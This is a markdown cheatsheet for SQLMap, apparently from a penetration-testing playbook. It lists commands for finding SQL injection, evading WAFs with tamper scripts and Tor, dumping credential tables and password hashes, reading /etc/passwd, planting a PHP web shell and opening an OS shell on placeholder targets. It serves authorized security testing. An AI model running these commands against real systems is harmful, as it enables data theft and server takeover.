# 💉 SQLMap Cheatsheet

A quick-reference guide for automated SQL injection detection and exploitation using SQLMap.

> [!WARNING]
> **Ethical Use Only:** SQLMap is a powerful tool. Only use it against systems you own or have explicit written authorization to test.

> [!TIP]
> Always start with `--level 1 --risk 1` (the defaults) and only increase if needed. Higher levels send more aggressive and potentially destructive payloads.

## 🚀 Basic Usage
```bash
# Test a URL with a GET parameter
sqlmap -u "http://target.com/item?id=1"

# Test a POST request (grab the raw request from Burp Suite)
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Test using a saved Burp Suite request file
sqlmap -r request.txt

# Mark the injection point explicitly with an asterisk (*)
sqlmap -u "http://target.com/item?id=*"
```

## ⚙️ Common Flags & Options

### Target Specification
| Flag | Description |
|------|-------------|
| `-u <URL>` | Target URL |
| `-r <file>` | Load raw HTTP request from file (from Burp) |
| `--data "<params>"` | POST body parameters |
| `-p <param>` | Specify which parameter to test |
| `--cookie "<cookie>"` | Set session cookies |
| `-H "Header: value"` | Add a custom HTTP header |

### Detection Tuning
| Flag | Description |
|------|-------------|
| `--level 1-5` | Test depth (default: 1, max: 5). Higher = more vectors tested |
| `--risk 1-3` | Risk level (default: 1, max: 3). Higher = more dangerous payloads |
| `--dbms mysql` | Specify DBMS to skip fingerprinting (mysql, mssql, oracle, postgresql, sqlite) |
| `--technique BEUSTQ` | Limit injection techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline) |

### Bypasses & Evasion
| Flag | Description |
|------|-------------|
| `--tamper <script>` | Apply a tamper script to obfuscate payloads |
| `--tor` | Route traffic through Tor |
| `--random-agent` | Use a random User-Agent header |
| `--delay <secs>` | Delay between requests (avoids rate limiting) |
| `--proxy http://127.0.0.1:8080` | Route through Burp Suite |

## 🔍 Common Tamper Scripts
```bash
# Space to comment (/* */) — bypass basic WAF rules
sqlmap -u "http://target.com/?id=1" --tamper=space2comment

# Uppercase keywords — case-insensitive bypass
sqlmap -u "http://target.com/?id=1" --tamper=uppercase

# Combine multiple tampers
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,uppercase,randomcase

# List all available tamper scripts
sqlmap --list-tampers
```

## 🗄️ Enumeration & Extraction

### Database Structure
```bash
# Enumerate all databases
sqlmap -u "http://target.com/?id=1" --dbs

# Enumerate tables in a specific database
sqlmap -u "http://target.com/?id=1" -D target_db --tables

# Enumerate columns in a specific table
sqlmap -u "http://target.com/?id=1" -D target_db -T users --columns

# Dump all data from a table
sqlmap -u "http://target.com/?id=1" -D target_db -T users --dump

# Dump entire database (careful — can be slow and noisy)
sqlmap -u "http://target.com/?id=1" -D target_db --dump-all
```

### Targeted Credential Extraction
```bash
# Dump only specific columns (faster and less noisy)
sqlmap -u "http://target.com/?id=1" -D target_db -T users -C username,password --dump

# Apply a WHERE filter to limit results
sqlmap -u "http://target.com/?id=1" -D target_db -T users --where="id=1" --dump
```

### DBMS-Level Enumeration
```bash
# Get current DB user
sqlmap -u "http://target.com/?id=1" --current-user

# Get current database name
sqlmap -u "http://target.com/?id=1" --current-db

# Check if current user is DBA
sqlmap -u "http://target.com/?id=1" --is-dba

# List all DBMS users (requires high privileges)
sqlmap -u "http://target.com/?id=1" --users

# Dump password hashes for all DB users
sqlmap -u "http://target.com/?id=1" --passwords
```

## 💻 OS-Level Access (High Privilege Required)

> [!CAUTION]
> These techniques require DBA-level DB privileges. Only use in authorized tests.

```bash
# Read a local file via LOAD_FILE (MySQL)
sqlmap -u "http://target.com/?id=1" --file-read=/etc/passwd

# Write a web shell to disk (requires write permissions + web root path)
sqlmap -u "http://target.com/?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php

# Get an interactive OS shell (attempts multiple techniques)
sqlmap -u "http://target.com/?id=1" --os-shell

# Get an interactive SQL shell
sqlmap -u "http://target.com/?id=1" --sql-shell
```

## 📋 Workflow — From Burp Suite to SQLMap

1. **Intercept** the request in Burp Suite Proxy
2. **Right-click → Save item** (or copy to file as `request.txt`)
3. Run SQLMap with the saved file:
```bash
# Step 1: Detect injection and fingerprint
sqlmap -r request.txt --level=2 --batch

# Step 2: Once injection found, enumerate databases
sqlmap -r request.txt --dbs --batch

# Step 3: Dump the target table
sqlmap -r request.txt -D app_db -T users --dump --batch
```
> `--batch` answers all prompts with the default answer (non-interactive mode)

## 💾 Output & Logging
```bash
# All results are saved automatically in ~/.local/share/sqlmap/output/<target>/

# Set a custom output directory
sqlmap -u "http://target.com/?id=1" --output-dir=/tmp/sqlmap_results

# Increase verbosity (1-6, default: 1)
sqlmap -u "http://target.com/?id=1" -v 3
```

---
*Return to [SimplySec Playbook](../README.md)*
